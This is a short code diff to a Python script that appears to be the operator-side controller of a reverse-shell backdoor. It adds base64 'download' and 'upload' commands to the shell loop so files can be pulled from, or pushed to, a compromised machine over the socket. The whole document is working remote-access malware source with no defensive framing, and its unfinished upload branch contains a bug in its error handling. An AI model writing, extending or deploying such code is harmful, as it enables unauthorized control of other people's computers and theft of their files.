@@ -6,6 +6,7 @@ import socket
 from termcolor import colored
 import json
 import os
+import base64
 
 def reliable_send(data):
     jsonData = json.dumps(data)
@@ -28,6 +29,18 @@ def shell():
             break
         elif command[:2] == "cd" and len(command) > 1:
             continue
+        elif command[:8] == "download":
+            with open(command[9:], "wb") as download:
+                fileData = reliable_recv()
+                download.write(base64.b64decode(fileData))
+        elif command[:6] == "upload": #Work in Progress
+            with open(command[7:], "rb") as upload:
+                try:
+                    reliable_send(base64.b64encode(upload.read()))
+                except:
+                    failed = '[-] Failed to Upload'
+                    print(colored(failed, "red"))
+                    reliable_send(base64.b64encode(failed))
         else:
             result = reliable_recv()
             print(result)
